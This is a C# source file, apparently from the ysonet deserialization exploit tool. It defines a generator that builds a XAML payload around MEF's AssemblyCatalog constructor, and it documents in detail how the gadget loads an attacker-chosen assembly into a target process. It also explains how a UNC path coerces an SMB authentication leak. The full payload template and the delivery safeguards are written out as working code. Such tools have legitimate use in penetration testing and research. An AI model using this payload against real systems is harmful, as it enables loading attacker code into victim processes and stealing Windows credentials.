using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.ComponentModel.Composition.Hosting.AssemblyCatalog is the MEF part catalog that
    /// discovers exported types in one assembly. It ships in the .NET Framework GAC
    /// (System.ComponentModel.Composition, Version=4.0.0.0) since 4.0, so no application
    /// reference is needed on the target.
    ///
    /// It turns ONE STRING into a loaded assembly, and it does it from a PUBLIC CONSTRUCTOR:
    ///
    ///   public AssemblyCatalog(string codeBase)
    ///   {
    ///       Requires.NotNullOrEmpty(codeBase, "codeBase");
    ///       InitializeAssemblyCatalog(LoadAssembly(codeBase));
    ///       _definitionOrigin = this;
    ///   }
    ///
    ///   private static Assembly LoadAssembly(string codeBase)
    ///   {
    ///       AssemblyName assemblyName;
    ///       try
    ///       {
    ///           assemblyName = AssemblyName.GetAssemblyName(codeBase);   // 1. OPENS the path
    ///       }
    ///       catch (ArgumentException)
    ///       {
    ///           assemblyName = new AssemblyName();
    ///           assemblyName.CodeBase = codeBase;
    ///       }
    ///       return Assembly.Load(assemblyName);                          // 2. LOADS it
    ///   }
    ///
    /// So one operator string produces two separate effects, and the first one happens even
    /// when the second fails:
    ///
    ///   1. AssemblyName.GetAssemblyName OPENS the path to read its metadata. A UNC path here
    ///      is an outbound SMB session, and Windows sends authentication material when it
    ///      opens one. Nothing has to exist on the share for the session to start.
    ///   2. Assembly.Load then binds the name it read. GetAssemblyName also fills in
    ///      AssemblyName.CodeBase, so when normal probing does not already have that identity
    ///      the loader falls back to the operator's path and the assembly is loaded into the
    ///      default load context.
    ///
    /// WHAT THE LOAD DOES NOT DO, measured rather than assumed. A bare Assembly.Load runs
    /// nothing: an assembly emitted with a module initializer (a global .cctor) was loaded by
    /// this chain and the initializer did NOT run, because the CLI only promises to run it
    /// before the first access to something in that module. InitializeAssemblyCatalog just
    /// stores the assembly - it does not call GetTypes - so the payload ENDS with the
    /// operator's assembly resident in the target process. Execution needs one more step that
    /// belongs to the target: it touches the catalog (the InnerCatalog getter builds a
    /// TypeCatalog and honours the assembly's own [CatalogReflectionContext] attribute), or it
    /// resolves a type from the now-loaded assembly by name, or the assembly is mixed mode and
    /// its native DllMain runs at load. That is why AdditionalInfo() says "loads", not "runs".
    ///
    /// XAML IS THE ONLY POSSIBLE FORMATTER, and unusually the reason is not about what a
    /// serializer can NAME - it is that there is nothing to name. AssemblyCatalog exposes NO
    /// settable member at all (Assembly and Parts are both getter-only), so the constructor
    /// parameter is the one and only way in, and it has no parameterless constructor to reach
    /// it from. That splits the catalogue cleanly:
    ///
    ///   - Every "construct the type, then assign members by name" serializer is out because
    ///     there is no member to assign AND no parameterless constructor to construct with:
    ///     FastJson, JavaScriptSerializer, YamlDotNet, both SharpSerializer modes and both
    ///     MessagePack Typeless flavours.
    ///   - Json.NET can bind a parameterized constructor, but only when the type has EXACTLY
    ///     ONE public constructor (DefaultContractResolver.GetParameterizedConstructor returns
    ///     null otherwise). AssemblyCatalog has EIGHT, so Json.NET has no creator either.
    ///   - BinaryFormatter, SoapFormatter, LosFormatter and FsPickler reject the TYPE:
    ///     AssemblyCatalog is not [Serializable].
    ///   - NetDataContractSerializer refuses it as a non-data-contract, and the DataContract
    ///     family plus XmlSerializer see a type that implements IEnumerable and want a
    ///     collection with a parameterless constructor.
    ///
    /// XAML wins because x:Arguments passes constructor arguments, which is the one capability
    /// none of the others have.
    ///
    /// TWO DETAILS OF THE DOCUMENT THAT ARE LOAD BEARING.
    ///
    ///   - x:Arguments must be an ELEMENT and it must come before anything else in the
    ///     content: the object does not exist until the writer has read the arguments.
    ///   - The argument carries operator data, so it needs xml:space="preserve". Without it a
    ///     XAML reader normalizes element content - measured: "  C:\a  b  \x.dll  " arrives as
    ///     "C:\a b \x.dll" - and the target would open a different file. WPF's
    ///     XamlReader.Load(XmlReader) honours the attribute, so the value arrives byte for
    ///     byte. RefuseIfPathDidNotSurvive below re-reads the emitted document and checks both
    ///     halves rather than trusting either.
    ///
    /// WHY THIS IS NOT AssemblyInstallerLoad. That gadget reaches Assembly.LoadFrom through a
    /// property SETTER (AssemblyInstaller.Path) and then runs the operator's installer
    /// constructors through a getter chain, so it needs System.Configuration.Install AND a
    /// WinForms getter-call carrier, and it reaches nine formatters. This one needs only MEF,
    /// names one type, and its whole payload is a single element - which is what makes it
    /// useful against a target that reaches XAML but blocks the usual carriers. Its effect
    /// stops at the load, so it is the weaker of the two wherever both are available.
    ///
    /// Everything this gadget emits lives in this file: the target type name, the constructor
    /// argument shape and the one document template.
    /// </summary>
    public class AssemblyCatalogLoadGenerator : GenericGenerator
    {
        private bool rawInput;

        // The version axis describes the framework the TARGET PROCESS RUNS ON.
        // System.ComponentModel.Composition 4.0.0.0 has been in the .NET Framework GAC since
        // 4.0 and LoadAssembly has the same body there as on the newest build, so the floor is
        // the CLR v4 generation this tool targets; the ceiling is what the fire row observed.
        //
        // file-system is declared alongside code-execution because the first half of the sink
        // is a real OPEN of a path the operator names, and it happens whether or not the load
        // that follows succeeds.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution, PayloadKind.Network, PayloadKind.FileSystem)
                // Declared rather than derived: CommandInput() is DllPath because a path to an
                // assembly is what -c means, but an operator hunting for the SMB
                // credential-coercion use searches for the UNC input and must find this.
                .WithInputs(PayloadInput.AssemblyFile, PayloadInput.UncPath, PayloadInput.TargetPath)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // Found by this project's own sweep of constructor-triggered sinks. The MEF catalog
        // constructors are not in the published .NET gadget literature (checked against
        // "Friday the 13th: JSON Attacks" and the later XAML write-ups), so there is no
        // earlier researcher to credit here.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Kept SHORT on purpose: this is the first block of the interactive info panel, and a
        // long one pushes Formatters, Command input and the category summary off the visible
        // rows. The whole story is in the class comment and docs/usage-and-examples.md.
        public override string AdditionalInfo()
        {
            return "MEF AssemblyCatalog(codeBase) opens -c and loads it as an assembly. A UNC path also starts an SMB session, which sends authentication material. The load alone runs no code.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        /// <summary>
        /// Xaml, and only Xaml. The measured reasons are in the class comment; the short form
        /// is that AssemblyCatalog has no settable member, so the constructor parameter is the
        /// only way in, and XAML is the only formatter in this catalogue that can pass one.
        /// </summary>
        public override List<string> SupportedFormatters()
        {
            return new List<string> { Formatters.Xaml };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.DllPath;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            string codeBase = inputArgs.Cmd;

            // Build and shrink FIRST with the self-test off, so a value a minifier rewrote is
            // refused before -t makes THIS process open and load the wrong file. Everything
            // below can then assume the emitted document still carries what the operator typed.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(BuildPayload(codeBase, formatter), formatter, probeArgs);
            RefuseIfPathDidNotSurvive(probe, codeBase, formatter, inputArgs);

            if (!inputArgs.Test)
                return probe;

            // -t is ACCEPTED. It deserializes the payload here, so the operator's own assembly
            // is loaded into THIS process (and a .NET assembly cannot be unloaded from an
            // AppDomain), and a UNC value makes this machine open the SMB session. That is a
            // self-exploit, which is what -t means in ysonet - the same thing -t on
            // AssemblyInstallerLoad or ObjectDataProvider does. Only -t a path you trust.
            return FinishHandWrittenPayload(BuildPayload(codeBase, formatter), formatter, inputArgs);
        }

        private object BuildPayload(string codeBase, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // The whole payload. x:Arguments selects AssemblyCatalog(string codeBase) - the
                // one-argument constructor - out of the eight public ones, and it has to be an
                // element because the object is not created until its arguments are read.
                return @"<mef:AssemblyCatalog xmlns:mef=""clr-namespace:System.ComponentModel.Composition.Hosting;assembly=System.ComponentModel.Composition"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:s=""clr-namespace:System;assembly=mscorlib"">
  <x:Arguments>
    <s:String xml:space=""preserve"">" + EscapeForXmlText(codeBase, rawInput) + @"</s:String>
  </x:Arguments>
</mef:AssemblyCatalog>";
            }

            throw UnsupportedFormatter(formatter);
        }

        /// <summary>
        /// The path is operator DATA the target OPENS and then LOADS, so it has to arrive byte
        /// for byte. Two separate things can rewrite it, and both are checked against the
        /// emitted document rather than predicted from the input:
        ///
        ///   1. the value itself, which --minify's XML pass can trim; and
        ///   2. the xml:space="preserve" attribute that stops the TARGET's XAML reader
        ///      normalizing the argument. Losing only that one is the dangerous case, because
        ///      the document would still contain the exact text and only the target would see
        ///      a different path.
        ///
        /// Skipped under --rawinput, where the operator has taken the escaping decision
        /// themselves and the document is not guaranteed to parse.
        /// </summary>
        private void RefuseIfPathDidNotSurvive(object payload, string codeBase, string formatter,
            InputArgs inputArgs)
        {
            if (rawInput)
                return;

            string xml = MinifiedTextGuard.AsXmlText(payload);

            // Attributes are excluded from the comparison: the value travels in element TEXT,
            // and the element's siblings carry xmlns values that must never be able to stand in
            // for it.
            bool valueSurvived =
                MinifiedTextGuard.MissingTextValues(payload, new[] { codeBase }, false).Count == 0;
            // One constructor argument, so one xml:space="preserve" is expected.
            bool whitespacePreserved = xml == null || MinifiedTextGuard.CountXmlSpacePreserve(xml) >= 1;

            if (valueSurvived && whitespacePreserved)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this path with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer delivers \"" + codeBase
                + "\" exactly, so the target would open a different file."
                + (whitespacePreserved
                    ? ""
                    : " The xml:space=\"preserve\" attribute on the constructor argument is gone,"
                        + " so a XAML reader would normalize the value.")
                // The advice is MEASURED against this document (AssemblyCatalogLoadMinifyAdvice
                // in the suite), not copied from a sibling gadget: two XAML documents can share
                // a loss without sharing its cause. A carriage return is lost with no minifier
                // at all, to XML's own line-ending normalization, so dropping --minify does not
                // recover one.
                + (minified
                    ? " Use a path with no leading or trailing whitespace in the value and no"
                        + " carriage return; dropping --minify recovers the leading and trailing"
                        + " whitespace, and nothing else."
                    : " Use a path with no carriage return: the value travels in XML element"
                        + " text, and no parser can carry one there."));
        }
    }
}
